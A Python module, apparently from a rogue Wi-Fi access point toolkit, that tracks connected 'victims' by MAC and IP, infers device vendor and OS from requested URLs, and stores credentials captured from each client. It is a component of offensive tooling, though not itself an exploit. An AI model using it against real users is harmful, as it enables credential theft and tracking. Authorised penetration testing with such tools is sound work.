import time
import logging
from macmatcher import MACMatcher

class Victim(object):
    """Represents a victim connected to the AP."""
    def __init__(self, mac, ip):
        self.timestamp = time.time()
        self.mac_address = mac
        self.ip_address = ip
        self.vendor = None
        self.os = None
        self.credentials = []

class VictimManager():
    """Singleton class that manages all of the victims."""

    # Instance will be stored here.
    __instance = None

    @staticmethod
    def get_instance():
        """Return the instance of the class or create new if none exists."""
        if VictimManager.__instance is None:
            VictimManager()
        return VictimManager.__instance

    def __init__(self, mac_to_vendor_path_file, url_to_os_path_file):
        """Initialize the class."""
        if VictimManager.__instance:
            raise Exception("Error: Victims class is a singleton!")
        else:
            VictimManager.__instance = self
            self.victims_dic = {}
            self.mac2vendor = MACMatcher(mac_to_vendor_path_file)
            self.url2os = open(url_to_os_path_file, "r")

    def add(self, mac, ip):
        new_victim = Victim(mac, ip)
        new_victim.vendor = self.mac2vendor.get_vendor_name(mac)
        self.victims_dic[mac] = new_victim

    def update_os(self, ip, url):
        """Find and update Victims os based on the url it requests.
        Receives a victims ip address and request as input, finds the
        corresponding os by reading the initial requests file and then accesses
        the victim dictionary and changes the os for the victim with the
        corresponding ip address."""
        self.url2os.seek(0)
        for line in self.url2os:
            line = line.split("|")
            url_check = line[1].strip()
            os = line[0].strip()
            if url_check in url:
                for key in self.victims_dic:
                    if self.victims_dic[key].ip_address == ip:
                        self.victims_dic[key].os = os

    def add_credentials(self, ip, data):
        for mac in self.victims_dic:
            if self.victims_dic[mac].ip_address == ip:
                self.victims_dic[mac].credentials.append(data)
    
    def get_victim(self, ip):
        for mac in self.victims_dic:
            if self.victims_dic[mac].ip_address == ip:
                return self.victims_dic[mac]
        return None